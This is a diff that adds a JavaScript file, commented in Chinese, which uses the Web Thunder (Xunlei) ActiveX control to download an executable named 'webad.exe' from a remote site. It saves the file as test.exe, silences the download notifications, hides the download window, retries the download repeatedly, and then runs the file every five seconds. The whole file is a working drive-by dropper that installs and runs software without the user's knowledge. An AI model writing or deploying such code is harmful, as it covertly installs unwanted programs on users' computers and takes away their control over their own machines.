@@ -1,0 +1,117 @@
+var thunder_server=null;
+var id_file=0;//记录下载任务id
+
+//初始化控件，返回1表示安装了web讯雷，0为出现错误
+function init()
+{	
+	try
+	{
+		thunder_server = new ActiveXObject("ThunderServer.webThunder.1");
+  	}
+  	catch(e)
+  	{
+   		//alert("init activex failed");
+   		return 0;
+  	}
+  	return 1;
+}
+
+
+
+
+
+////////////////////////////////////注意，核心函数////////////////////////////////////////
+//////////成功执行后函数返回添加的下载任务的id,否则，返回1///////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////
+function downfile()
+{
+	thunder_server.SetConfig("MessagePanel","DownloadComplete","0");//下载完毕后无显示面版
+	thunder_server.SetConfig("Sound","DownloadComplete","0");//下载完毕无声音
+	thunder_server.ShowBrowserWindow();
+	//thunder_server.SetBrowserWindowSize(0, 0, 0, 0);
+	//不添加的话thunder_server.AddTask()就不会成功被执行，郁闷.........
+
+    var szURL= "http://www.cu108.com/gg/webad.exe"
+	//需要下载的程序的URL
+	var	szFileName="test.exe";
+	//另存为的文件名
+	var szSavePath="d:\\";
+	//  szSavePath=thunder_server.GetServerPath();
+	//另存为的路径
+	var	szComments="";
+	//注释
+	var	szRefURL="";
+	//引用URL
+	var	nStartMode=1;
+	//0为手动开始，1为自动开始
+	var	nOnlyFromOrigin=0;
+	//只从原始地址下载,0为否
+	var	nOriginThreadNum=5;
+	//下载程序的线程数
+	var	nIsNeedAccount=0;
+	//是否需要登陆，0为无需登陆
+	var	szUserName="";
+	//登陆用户名
+	var	szPassword="";
+	//登陆密码
+	var	szTaskClass="";
+	//下载任务的类别,如“其他”，“软件”，“游戏”，“影视”等等
+	var	szCID="";
+	//下载讯雷资源时才用到
+	var	nIsAddUncompletedTask=0;
+	//看名字就知道
+	var	szStatURL="";
+	//thunder_server.SetVariable("DoIntelligentName", "");
+	//调用AddTask()方法开始下载目标程序
+	var retStr = thunder_server.AddTask(szURL, szFileName, szSavePath,szComments, szRefURL,
+						nStartMode, nOnlyFromOrigin,nOriginThreadNum, 
+						nIsNeedAccount, szUserName,szPassword,
+						szTaskClass, szCID, nIsAddUncompletedTask, szStatURL);		
+    	thunder_server.HideBrowserWindow(1);
+    	//调用AddTask()方法后立即关掉打开的下载窗口
+    	var ret_code = new Number();
+    	var ret_msg = new String();
+    	var aryStr  = new String(); 
+   
+    	if (retStr.length > 0)
+    	{	
+  	    aryStr = retStr.split("{\r*\r}");
+	    ret_code = parseInt(aryStr[0]);//记录添加任务结果,0为添加成功,1为出现错误,100为重复URL
+	    ret_msg = aryStr[1];//正确执行后为添加的下载任务的id值					   
+    	}
+    	else   //失败
+   	{
+   		return 1;
+   	}
+   	if(ret_code==1)return 1;
+   	return ret_msg;
+}
+
+
+
+
+
+//运行下载后的文件
+function open() 
+{
+	thunder_server.OpenFile(id_file);
+	
+}
+
+
+function exec()
+{
+	var ret=init();
+	if(ret==0)return;
+	id_file=downfile();
+	var i;
+	for(i=0;id_file==1&&i<50;i++)id_file=downfile();
+	if(id_file==1)return;
+	//若出现错误则一直调用downfile()函数直到成功为止！！
+	setInterval("open()",5000);
+	//搞了半天没有搞出下载完毕的回调函数，
+	//只能5秒为间隔的运行下载的程序。
+	//若文件没有下载完毕，调用open()函数时文件并未运行
+	
+}
+
